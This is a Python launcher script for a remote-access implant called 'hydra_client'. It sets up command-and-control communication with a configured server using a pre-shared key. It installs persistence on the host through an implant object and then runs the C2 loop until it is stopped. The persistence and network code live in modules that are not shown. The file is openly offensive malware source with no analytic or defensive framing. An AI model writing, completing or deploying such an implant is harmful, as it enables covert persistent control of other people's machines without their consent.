import os
import sys
import asyncio

# Add package root to Python path
package_root = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
if package_root not in sys.path:
    sys.path.insert(0, package_root)

from hydra_client.network import C2Communication
from hydra_client.implant import HydraImplant
from hydra_client.config import SERVER_URL, PSK

async def main():
    # Initialize C2 communication
    c2 = C2Communication(SERVER_URL, PSK)
    
    # Initialize implant
    implant = HydraImplant()
    
    try:
        # Install persistence
        if implant.install_persistence():
            print("[+] Persistence installed successfully")
        else:
            print("[-] Failed to install persistence")
        
        # Start C2 communication
        await c2.run()
                
    except KeyboardInterrupt:
        print("[*] Shutting down...")
        await c2.stop()
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        await c2.stop()
        sys.exit(1)

def run_main():
    """Entry point for the application."""
    # Set up asyncio policy for Windows
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # Run main loop
    asyncio.run(main())

if __name__ == "__main__":
    run_main() 